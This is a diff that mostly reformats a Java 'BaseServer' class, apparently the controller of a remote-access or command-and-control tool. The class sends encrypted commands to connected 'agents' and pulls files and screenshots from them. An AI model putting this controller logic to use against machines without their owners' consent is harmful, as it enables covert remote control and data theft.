@@ -8,6 +8,7 @@ import com.tomcat.core.output.Logger;
 import com.tomcat.core.session.Session;
 import com.tomcat.core.session.SessionManager;
 import com.tomcat.utils.ServerConfig;
+
 import java.io.*;
 import java.net.Socket;
 import java.nio.file.*;
@@ -15,7 +16,6 @@ import java.util.*;
 import java.util.concurrent.*;
 
 public abstract class BaseServer {
-
     protected final String Host;
     protected final int Port;
     protected final ServerConfig Config;
@@ -25,7 +25,7 @@ public abstract class BaseServer {
     protected final ConcurrentHashMap<Integer, Object> CommandLocks;
     protected volatile boolean Running;
 
-    protected static final byte[] EndMarker = "<END>".getBytes();
+    protected static final byte[] EndMarker  = "<END>".getBytes();
     protected static final byte[] MetaMarker = "<META>".getBytes();
     protected static final Gson GsonInstance = new Gson();
 
@@ -37,17 +37,13 @@ public abstract class BaseServer {
         this.Sessions = new SessionManager();
         this.Events = new EventManager();
         this.CommandLocks = new ConcurrentHashMap<>();
-        try {
-            this.Crypto.GenerateKey();
-        } catch (Exception E) {
+        try { this.Crypto.GenerateKey(); } catch (Exception E) {
             Logger.ErrorMsg("Failed to generate crypto key: " + E.getMessage());
         }
     }
 
     public abstract boolean[] StartServer();
-
     public abstract void StopServer();
-
     public abstract void AcceptConnections();
 
     public void AddEventListener(EventManager.EventListener Listener) {
@@ -104,17 +100,15 @@ public abstract class BaseServer {
                 try {
                     Object Lock = CommandLocks.get(SessionId);
                     if (Lock != null) {
-                        synchronized (Lock) {}
+                        synchronized (Lock) { /* wait for command to finish */ }
                     }
                     Sock.getInputStream().available();
                     int PeekByte = Sock.getInputStream().read();
                     if (PeekByte == -1) throw new IOException("Agent disconnected");
                     Thread.sleep(3000);
                 } catch (Exception E) {
-                    Events.Trigger(
-                        EventType.AgentDisconnected,
-                        EventManager.BuildData("ID", SessionId, "Reason", E.getMessage())
-                    );
+                    Events.Trigger(EventType.AgentDisconnected,
+                        EventManager.BuildData("ID", SessionId, "Reason", E.getMessage()));
                     RemoveSession(SessionId);
                     break;
                 }
@@ -126,12 +120,12 @@ public abstract class BaseServer {
 
     public String[] ExecuteCommand(int SessionId, String Command) {
         Optional<Session> OptSession = Sessions.Get(SessionId);
-        if (OptSession.isEmpty()) return new String[] { "false", "Session not found" };
+        if (OptSession.isEmpty()) return new String[]{"false", "Session not found"};
         Session S = OptSession.get();
         String CmdLower = Command.trim().toLowerCase();
         boolean IsUpload = CmdLower.startsWith("upload");
-        boolean IsDownload =
-            CmdLower.startsWith("download") || CmdLower.startsWith("dl ") || CmdLower.startsWith("screenshot");
+        boolean IsDownload = CmdLower.startsWith("download") ||
+            CmdLower.startsWith("dl ") || CmdLower.startsWith("screenshot");
         try {
             if (IsUpload) return HandleUpload(S, Command);
             byte[] Encrypted = Crypto.Encrypt(Command.getBytes("UTF-8"));
@@ -141,12 +135,12 @@ public abstract class BaseServer {
             Out.flush();
             if (IsDownload) return HandleDownload(S);
             byte[] Response = ReadResponse(S.GetSocket(), Config.GetCommandTimeout());
-            if (Response == null) return new String[] { "false", "No response from agent" };
+            if (Response == null) return new String[]{"false", "No response from agent"};
             String Decrypted = Crypto.DecryptString(Response);
-            return new String[] { "true", Decrypted };
+            return new String[]{"true", Decrypted};
         } catch (Exception E) {
             RemoveSession(SessionId);
-            return new String[] { "false", "Error: " + E.getMessage() };
+            return new String[]{"false", "Error: " + E.getMessage()};
         }
     }
 
@@ -176,10 +170,10 @@ public abstract class BaseServer {
 
     private String[] HandleUpload(Session S, String Command) {
         String[] Parts = Command.trim().split("\\s+", 3);
-        if (Parts.length < 2) return new String[] { "false", "Usage: upload <local_path> [remote_path]" };
+        if (Parts.length < 2) return new String[]{"false", "Usage: upload <local_path> [remote_path]"};
         String LocalPath = Parts[1];
         String RemotePath = Parts.length > 2 ? Parts[2] : "";
-        if (!Files.exists(Paths.get(LocalPath))) return new String[] { "false", "Local file not found: " + LocalPath };
+        if (!Files.exists(Paths.get(LocalPath))) return new String[]{"false", "Local file not found: " + LocalPath};
         try {
             String Filename = Paths.get(LocalPath).getFileName().toString();
             String AgentCmd = RemotePath.isEmpty() ? "upload " + Filename : "upload " + RemotePath;
@@ -201,9 +195,9 @@ public abstract class BaseServer {
             Out.write(FileData);
             Out.write(EndMarker);
             Out.flush();
-            return new String[] { "true", "File sent: " + Filename + " (" + FileData.length + " bytes)" };
+            return new String[]{"true", "File sent: " + Filename + " (" + FileData.length + " bytes)"};
         } catch (Exception E) {
-            return new String[] { "false", "Upload error: " + E.getMessage() };
+            return new String[]{"false", "Upload error: " + E.getMessage()};
         }
     }
 
@@ -214,11 +208,8 @@ public abstract class BaseServer {
             S.GetSocket().setSoTimeout(30000);
             while (true) {
                 int N;
-                try {
-                    N = S.GetSocket().getInputStream().read(Tmp);
-                } catch (java.net.SocketTimeoutException E) {
-                    break;
-                }
+                try { N = S.GetSocket().getInputStream().read(Tmp); }
+                catch (java.net.SocketTimeoutException E) { break; }
                 if (N == -1) break;
                 Buffer.write(Tmp, 0, N);
                 byte[] Current = Buffer.toByteArray();
@@ -237,29 +228,24 @@ public abstract class BaseServer {
                 S.GetSocket().setSoTimeout(30000);
                 while (!EndsWith(FileBuffer.toByteArray(), EndMarker)) {
                     int N;
-                    try {
-                        N = S.GetSocket().getInputStream().read(Tmp);
-                    } catch (java.net.SocketTimeoutException E) {
-                        break;
-                    }
+                    try { N = S.GetSocket().getInputStream().read(Tmp); }
+                    catch (java.net.SocketTimeoutException E) { break; }
                     if (N == -1) break;
                     FileBuffer.write(Tmp, 0, N);
                 }
                 byte[] FileData = FileBuffer.toByteArray();
-                if (EndsWith(FileData, EndMarker)) FileData = Arrays.copyOf(
-                    FileData,
-                    FileData.length - EndMarker.length
-                );
+                if (EndsWith(FileData, EndMarker))
+                    FileData = Arrays.copyOf(FileData, FileData.length - EndMarker.length);
                 String SavePath = SaveFile(Filename, FileData, S.GetId());
                 return SavePath != null
-                    ? new String[] { "true", "File saved: " + SavePath }
-                    : new String[] { "false", "Failed to save file" };
+                    ? new String[]{"true", "File saved: " + SavePath}
+                    : new String[]{"false", "Failed to save file"};
             }
             if (EndsWith(Data, EndMarker)) Data = Arrays.copyOf(Data, Data.length - EndMarker.length);
             String Decrypted = Crypto.DecryptString(Data);
-            return new String[] { "true", Decrypted };
+            return new String[]{"true", Decrypted};
         } catch (Exception E) {
-            return new String[] { "false", "Download error: " + E.getMessage() };
+            return new String[]{"false", "Download error: " + E.getMessage()};
         }
     }
 
@@ -270,10 +256,7 @@ public abstract class BaseServer {
             String Base = Filename;
             String Ext = "";
             int Dot = Filename.lastIndexOf('.');
-            if (Dot > 0) {
-                Base = Filename.substring(0, Dot);
-                Ext = Filename.substring(Dot);
-            }
+            if (Dot > 0) { Base = Filename.substring(0, Dot); Ext = Filename.substring(Dot); }
             Path Target = Dir.resolve(Filename);
             for (int I = 1; Files.exists(Target); I++) Target = Dir.resolve(Base + "_" + I + Ext);
             Files.write(Target, Data);
@@ -290,33 +273,17 @@ public abstract class BaseServer {
         Events.Trigger(EventType.AgentRemoved, EventManager.BuildData("ID", SessionId));
     }
 
-    public SessionManager GetSessions() {
-        return Sessions;
-    }
-
-    public EventManager GetEvents() {
-        return Events;
-    }
-
-    public SymmetricCrypto GetCrypto() {
-        return Crypto;
-    }
-
-    public String GetHost() {
-        return Host;
-    }
-
-    public int GetPort() {
-        return Port;
-    }
-
-    public boolean IsRunning() {
-        return Running;
-    }
+    public SessionManager GetSessions() { return Sessions; }
+    public EventManager GetEvents() { return Events; }
+    public SymmetricCrypto GetCrypto() { return Crypto; }
+    public String GetHost() { return Host; }
+    public int GetPort() { return Port; }
+    public boolean IsRunning() { return Running; }
 
     protected boolean EndsWith(byte[] Data, byte[] Suffix) {
         if (Data.length < Suffix.length) return false;
-        for (int I = 0; I < Suffix.length; I++) if (Data[Data.length - Suffix.length + I] != Suffix[I]) return false;
+        for (int I = 0; I < Suffix.length; I++)
+            if (Data[Data.length - Suffix.length + I] != Suffix[I]) return false;
         return true;
     }
 
@@ -325,8 +292,10 @@ public abstract class BaseServer {
     }
 
     protected int IndexOf(byte[] Data, byte[] Pattern) {
-        outer: for (int I = 0; I <= Data.length - Pattern.length; I++) {
-            for (int J = 0; J < Pattern.length; J++) if (Data[I + J] != Pattern[J]) continue outer;
+        outer:
+        for (int I = 0; I <= Data.length - Pattern.length; I++) {
+            for (int J = 0; J < Pattern.length; J++)
+                if (Data[I + J] != Pattern[J]) continue outer;
             return I;
         }
         return -1;
